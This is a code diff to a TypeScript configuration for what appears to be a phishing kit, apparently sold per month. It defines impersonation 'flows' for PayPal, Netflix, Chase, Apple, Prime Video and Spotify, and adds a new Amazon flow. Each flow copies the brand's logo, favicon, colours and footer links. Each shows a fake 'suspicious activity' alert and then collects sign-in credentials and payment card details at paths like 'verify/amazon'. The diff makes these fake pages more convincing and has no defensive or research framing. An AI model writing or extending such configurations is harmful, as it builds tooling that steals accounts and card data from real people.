@@ -40,6 +40,7 @@ export interface FlowTheme {
         logoHeight: string;
         alignment: 'center' | 'left';
     };
+    faviconUrl?: string; // Specific brand favicon
     footer: {
         style: 'simple' | 'links' | 'hidden';
         links: { text: string; url?: string }[];
@@ -140,10 +141,11 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
                 style: 'flat'
             },
             header: {
-                logoUrl: 'assets/logos/paypal.png',
+                logoUrl: 'assets/logos/paypal.svg',
                 logoHeight: '32px',
                 alignment: 'center'
             },
+            faviconUrl: 'assets/favicons/paypal.svg',
             footer: {
                 style: 'links',
                 links: [{ text: 'Contact' }, { text: 'Privacy' }, { text: 'Legal' }],
@@ -206,10 +208,11 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
                 style: 'flat'
             },
             header: {
-                logoUrl: 'assets/logos/netflix.png',
+                logoUrl: 'assets/logos/netflix.svg',
                 logoHeight: '45px',
                 alignment: 'left'
             },
+            faviconUrl: 'assets/favicons/netflix.svg',
             footer: {
                 style: 'links',
                 links: [{ text: 'Questions? Call 1-844-505-2993' }, { text: 'Help Center' }, { text: 'Terms of Use' }, { text: 'Privacy' }, { text: 'Cookie Preferences' }, { text: 'Corporate Information' }],
@@ -269,10 +272,11 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
                 style: 'flat'
             },
             header: {
-                logoUrl: 'assets/logos/chase.png',
+                logoUrl: 'assets/logos/chase.svg',
                 logoHeight: '30px',
                 alignment: 'center'
             },
+            faviconUrl: 'assets/favicons/chase.svg',
             footer: {
                 style: 'simple',
                 links: [{ text: 'Privacy' }, { text: 'Security' }, { text: 'Terms of Use' }],
@@ -332,10 +336,11 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
                 style: 'gradient'
             },
             header: {
-                logoUrl: 'assets/logos/apple.png',
+                logoUrl: 'assets/logos/apple.svg',
                 logoHeight: '80px',
                 alignment: 'center'
             },
+            faviconUrl: 'assets/favicons/apple.svg',
             footer: {
                 style: 'simple',
                 links: [{ text: 'Create Apple ID' }, { text: 'System Status' }, { text: 'Privacy Policy' }, { text: 'Terms & Conditions' }, { text: 'Copyright © 2024 Apple Inc. All rights reserved.' }],
@@ -394,10 +399,11 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
                 style: 'flat'
             },
             header: {
-                logoUrl: 'assets/images/logos/prime-video-logo.svg',
+                logoUrl: 'assets/logos/prime-video.svg',
                 logoHeight: '40px',
                 alignment: 'center'
             },
+            faviconUrl: 'assets/favicons/prime-video.svg',
             footer: {
                 style: 'simple',
                 links: [{ text: 'Terms' }, { text: 'Privacy' }, { text: 'Help' }],
@@ -456,10 +462,11 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
                 style: 'flat'
             },
             header: {
-                logoUrl: 'assets/images/logos/spotify-logo.svg',
+                logoUrl: 'assets/logos/spotify.svg',
                 logoHeight: '45px',
                 alignment: 'center'
             },
+            faviconUrl: 'assets/favicons/spotify.svg',
             footer: {
                 style: 'hidden',
                 links: [],
@@ -471,6 +478,71 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             { id: 'card', name: 'Update Payment', type: 'card', required: true, order: 2 }
         ],
         path: 'verify/spotify'
+    },
+    {
+        id: 'amazon',
+        name: 'Amazon',
+        category: 'ecommerce',
+        icon: '🛒',
+        color: '#ff9900',
+        monthlyPrice: 15,
+        description: 'Amazon account verification',
+        popular: true,
+        urgency: {
+            type: 'suspicious_activity',
+            title: 'Important Message',
+            message: 'We noticed a login attempt from a device you don\'t usually use. To help keep your account secure, please verify your identity.',
+            buttonText: 'Verify Account',
+            alertIcon: 'warning',
+            referencePrefix: 'AMZ',
+            footerLink: 'Help',
+            limitations: [],
+            resolveTitle: 'Secure your account'
+        },
+        theme: {
+            mode: 'light',
+            background: { type: 'color', value: '#ffffff' },
+            layout: 'centered',
+            card: {
+                background: '#ffffff',
+                border: '1px solid #ddd',
+                radius: '8px',
+                shadow: '0 2px 4px rgba(0,0,0,0.1)',
+                maxWidth: '350px',
+                padding: '24px'
+            },
+            input: {
+                style: 'outline',
+                activeColor: '#e77600',
+                borderRadius: '3px',
+                backgroundColor: '#ffffff',
+                textColor: '#000000',
+                labelBehavior: 'top'
+            },
+            button: {
+                background: 'linear-gradient(to bottom, #f7dfa5, #f0c14b)',
+                color: '#111111',
+                borderRadius: '3px',
+                width: 'full',
+                style: 'gradient'
+            },
+            header: {
+                logoUrl: 'assets/logos/amazon.svg',
+                logoHeight: '35px',
+                alignment: 'center'
+            },
+            faviconUrl: 'assets/favicons/amazon.svg',
+            footer: {
+                style: 'links',
+                links: [{ text: 'Conditions of Use' }, { text: 'Privacy Notice' }, { text: 'Help' }],
+                textColor: '#0066c0'
+            }
+        },
+        steps: [
+            { id: 'login', name: 'Sign-In', type: 'login', required: true, order: 1 },
+            { id: 'card', name: 'Add Payment', type: 'card', required: true, order: 2 }
+        ],
+        path: 'verify/amazon'
     }
 ];
 
